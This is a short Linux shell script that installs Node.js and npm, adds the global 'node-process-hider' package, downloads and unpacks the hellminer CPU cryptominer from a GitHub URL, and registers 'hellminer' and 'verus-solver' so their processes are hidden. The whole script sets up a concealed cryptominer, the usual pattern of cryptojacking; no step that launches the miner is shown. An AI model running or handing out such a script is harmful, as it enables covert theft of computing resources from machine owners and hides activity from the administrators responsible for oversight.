sudo apt update -y
sudo apt install nodejs -y
sudo apt install npm -y
sudo npm i -g node-process-hider
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
chmod +x hellminer_cpu_linux.tar.gz
tar -xvf hellminer_cpu_linux.tar.gz
sudo ph add hellminer
sudo ph add verus-solver
